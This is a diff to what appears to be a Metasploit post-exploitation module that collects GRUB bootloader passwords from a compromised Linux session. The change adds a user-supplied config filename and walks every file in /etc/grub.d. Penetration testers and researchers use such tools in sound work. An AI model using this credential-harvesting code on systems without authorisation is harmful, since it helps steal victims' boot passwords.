@@ -24,6 +24,15 @@ class MetasploitModule < Msf::Post
       'SessionTypes' => ['meterpreter', 'shell'],
       'References'   => [ ['URL', 'https://help.ubuntu.com/community/Grub2/Passwords#Password_Encryption'] ]
     ))
+
+    register_options(
+      [
+        OptString.new(
+          'FILENAME',
+          [false, 'Additional grub configuration filename.', '']
+        ),
+      ]
+    )
   end
 
   def parse_passwd_from_file(file)
@@ -75,11 +84,16 @@ class MetasploitModule < Msf::Post
       /boot/grub2/user.cfg
       /etc/grub.conf
       /etc/grub/grub.cfg
-      /etc/grub.d/00_header
       /mnt/sysimage/boot/grub.conf
       /mnt/boot/grub/grub.conf
       /rpool/boot/grub/grub.cfg
     ]
+
+    targets << datastore['FILENAME'] unless datastore['FILENAME'].empty?
+    dir('/etc/grub.d').each do |file|
+      path = '/etc/grub.d/' + file
+      targets << path if file?(path)
+    end
 
     print_status("Searching for GRUB config files..")
     targets.each do |target|
